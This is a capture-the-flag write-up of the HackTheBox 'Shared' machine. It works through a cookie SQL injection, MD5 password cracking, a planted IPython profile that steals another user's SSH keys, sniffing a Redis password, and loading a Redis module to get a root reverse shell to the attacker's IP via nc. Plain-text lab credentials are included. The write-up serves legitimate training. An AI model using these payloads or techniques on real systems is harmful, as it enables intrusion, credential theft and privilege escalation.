---
description: Shared box from HackTheBox write up.
---

# Shared

## Nmap

Time to start with out typical Nmap scan:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate 1000 10.10.11.172           
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-03 11:30 EDT
Nmap scan report for 10.10.11.172
Host is up (0.054s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 26.27 seconds
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p22,80,443 10.10.11.172
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-03 11:31 EDT
Nmap scan report for 10.10.11.172
Host is up (0.055s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 91e835f4695fc2e20e2746e2a6b6d865 (RSA)
|   256 cffcc45d84fb580bbe2dad35409dc351 (ECDSA)
|_  256 a3386d750964ed70cf17499adc126d11 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://shared.htb
443/tcp open  ssl/http nginx 1.18.0
|_http-title: Did not follow redirect to https://shared.htb
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
|_http-server-header: nginx/1.18.0
| tls-nextprotoneg: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.42 seconds
```

I will focus in the website for now, looks like both ports are hosting the same application and redirecting to HTTPS.

## Web Application

According to a cookie name I saw this looks like a Prestashop application. I tested the page a bit and trying to buy something I found what looks like a virtual host: `checkout.shared.htb`. The checkout page was pretty useless and not doing nothing really.

At this point I will run both a directory scan and a virtual host scan. After a while, I did not find anything worth mentioning. The only thing is that I found where to create a client account and that the API in `/api` was disabled. Luckily, I saw something interesting in the `checkout.shared.htb` application.

The cookie used to load the cart information into the checkout page has this format:

```
{"PRODUCT_ID":"QUANTITY"}
```

I tried to edit the product ID and I noticed that it is SQL injectable with something like:

```
{"HI' UNION SELECT 1,(SELECT group_concat(0x7c,schema_name,0x7c) from information_schema.schemata),3 -- - ":"1"}
```

That returned the name of the existing databases. From there, I wrote a little Python script to allow me to query the database easily and after a while I found a username and a password:

```

SELECT group_concat(0x7c,schema_name,0x7c) from information_schema.schemata
|information_schema|,|checkout|

SELECT group_concat(0x7c,table_name,0x7c) from information_schema.tables where table_schema='checkout'
|user|,|product|

SELECT group_concat(0x7c,column_name,0x7c) from information_schema.columns where table_name='user'
|id|,|username|,|password|

select group_concat(0x7c,username,0x7c,0x7c,password,0x7c) from user
|james_mason||fc895d4eddc2fc12f995e18c865cf273|
```

That looks like a MD5 hash so using the Rockyou dictionary and Jhon I cracked it:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Shared]
└─$ john --format=raw-md5 --wordlist=/home/kali/Wordlists/rockyou.txt  hash                                      1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
Soleil101        (?)     
1g 0:00:00:00 DONE (2022-11-03 13:44) 10.00g/s 20908Kp/s 20908Kc/s 20908KC/s Sportster1..SoccerBabe
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Using the user and the password obtained as SSH credentials (`james_mason:Soleil101`) I got access to the machine!

## In the machine as `james_mason`

The first thing I noticed was that both Redis and MySQL were running as local services. This was more or less expected but good to know.

```bash
james_mason@shared:/var/www/shared.htb/ps$ netstat -lntp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

Also got the credentials for the database from the Prestashop configuration files. I was able to extract the administrator password and email from it but no luck with the cracking process so moving on for now.

```php
# /var/www/shared.htb/ps/app/config$ cat parameters.php 
<?php return array (
  'parameters' => 
  array (
    'database_host' => '127.0.0.1',
    'database_port' => '',
    'database_name' => 'pshop',
    'database_user' => 'pshop',
    'database_password' => 'T*k#cbND_C*WrQ9h',
...
```

```
MariaDB [pshop]> select email,passwd from ps_employee;
+------------------+--------------------------------------------------------------+
| email            | passwd                                                       |
+------------------+--------------------------------------------------------------+
| admin@shared.htb | $2y$10$weantheqSfuC7PO4L/tlKefZ59DBBXR7cz5jixaYKyvv3PlPw0xgS |
+------------------+--------------------------------------------------------------+
```

At this point I found a weird directory `/opt/scripts_review/`. The user `james_mason` is part of the `developer` group that can modify the contents of this directory. Since there is another user in the machine according to the `/etc/passwd` file called `dan_smith`, my first guess was that this user was executing whatever shell script I put there. Obviously, I was wrong and my scripts just got deleted again and again.

### Getting user

Using Pspy I saw something interesting:

```
2022/11/03 15:56:01 CMD: UID=1001 PID=7490   | /bin/sh -c /usr/bin/pkill ipython; cd /opt/
2022/11/03 15:56:01 CMD: UID=1001 PID=7491   | /usr/bin/pkill ipython 
2022/11/03 15:56:01 CMD: UID=1001 PID=7493   | /usr/bin/python3 /usr/local/bin/ipython 
```

As you can see, the user with UID 1001 (`dan_smith`) is actually doing some stuff in that folder. The thing is that is not really executing anything. I researched a bit about that `ipython` thing, looks like it is an interactive shell for Python and it is also used as the kernel for Jupyter. Diving into the documentation, I found something worth it:

<p align="center"><img alt="Screenshot of the Ipython profiles documentation" src="/assets/images/HackTheBox/Shared/ipythonDoc.png"></p>

Looks like profiles are used by `ipython` to load different configurations per project. This configuration files are just Python scripts that can run arbitraty code. According to the image above, I can put my own default profile in the working directory and `ipython` will happily use that instead of the one in the default location. 

I procceded to take my own default profile and added these lines to the configuration file:

```python
# profile_default/ipython_config.py
import os

hostname = "10.10.14.29"
response = os.system("ping -c 1 " + hostname)
```

After that, I just copied the directory to `/opt/scripts_review/` and waited for the pings in my tcpdump output:

```bash
┌──(kali㉿kali)-[~/Public/linux/tools]
└─$ sudo tcpdump icmp -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:54:52.355603 IP shared.htb > 10.10.14.29: ICMP echo request, id 40114, seq 1, length 64
16:54:52.355629 IP 10.10.14.29 > shared.htb: ICMP echo reply, id 40114, seq 1, length 64
```

Cool! We have code execution as `dan_smith`. I changed the code to be executed to something more interesting:

```python
import os

response = os.system("cp -r ~/.ssh ~/tricked; chmod -R 777 ~/tricked")
```

This code will copy the `.ssh` directory of the user `dan_smith` and change its permissions to allow me to read it. After that, I can just take the `dan_smith` SSH key and connect to the machine as him.

## Getting root

Again I found something interesting looking for files with the same groups as the user. In this case the group was `sysadmin` and the file was a binary:

```bash
dan_smith@shared:~$ /usr/local/bin/redis_connector_dev
[+] Logging to redis instance using password...

INFO command result:
# Server
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:10650
run_id:549c5725e037e36a1b621808b04554126747e2b1
tcp_port:6379
uptime_in_seconds:36
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:6566958
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
 <nil>
```

Remember the local Redis server? Well this program is connecting to it and pulling some information. Checking the Redis process I can see that it is running as `root` so I guess we found a possible privilege escalation vector.

```bash
dan_smith@shared:~$ ps -aux | grep redis
root       10802  0.2  0.7  65104 14624 ?        Ssl  17:39   0:00 /usr/bin/redis-server 127.0.0.1:6379
```

In order to get the password, there are two options:

- Reverse engineer the binary
- Try to listen for the packages comming from the binary to the Redis service

Let's see both options, the first one is pretty straigh forward. Using IDA64 you can decompile the binary and then search for the string "Logging". Why is that? Well the binary output shows:

```
[+] Logging to redis instance using password...
```

When starting the connection to Redis, my guess is that the password value should be near that. As you can see that is the case:

<p align="center"><img alt="Screenshot of the IDA64 output" src="/assets/images/HackTheBox/Shared/idaOutput.png"></p>

The problem with this method is that, even though the password is there, it has some junk at the end and we would need some try and error in order to get into Redis.

Time for the second method! You will say, man how do you pretend to sniff traffic if you are not root in the other machine? Well my friend, good question! I downloaded to my machine the binary and using SSH I forwarded my port 6379 to the victim port 6379. This way I can just listen for packages in my own machine!

```bash
# Start port forwarding
┌──(kali㉿kali)-[~/Documents/HTB/Shared]
└─$ ssh dan_smith@10.10.11.172 -i id_rsa -NL 6379:127.0.0.1:6379

# Start TCP dump with a config to generate a pcap file
┌──(kali㉿kali)-[~/Documents/HTB/Shared]
└─$ sudo tcpdump tcp -i lo -s 65535 -w redis.pcap
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 65535 bytes
14 packets captured
28 packets received by filter
0 packets dropped by kernel

# Launch the binary from my machine
┌──(kali㉿kali)-[~/Documents/HTB/Shared]
└─$ ./redis_connector_dev                                      
[+] Logging to redis instance using password...
...
```

Checking the `pcap` file I got the password for the Redis server! `F2WHqJUz2WEz=Gqq`

<p align="center"><img alt="Screenshot of the Wireshark output" src="/assets/images/HackTheBox/Shared/wiresharkOutput.png"></p>

Now the only thing left is to load a custom module into Redis to start executing system commands as `root`. The module I will use is this: [n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand){:target="_blank"}, just compile it with `make` in the attacker machine and move it to the victim. Now we can load it from Redis and the magic happens!

```bash
# In the victim machine
dan_smith@shared:~$ redis-cli -h 10.85.0.52
127.0.0.1:6379> auth F2WHqJUz2WEz=Gqq
OK
127.0.0.1:6379> MODULE LIST
(empty array)
127.0.0.1:6379> MODULE LOAD /home/dan_smith/module.so
OK
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.rev 10.10.14.29 8080
""

# In my machine
┌──(kali㉿kali)-[~/Documents/HTB/Shared]
└─$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.11.172] 49804
id
uid=0(root) gid=0(root) groups=0(root)
```

We are `root`! Grab the flag and call it a day!
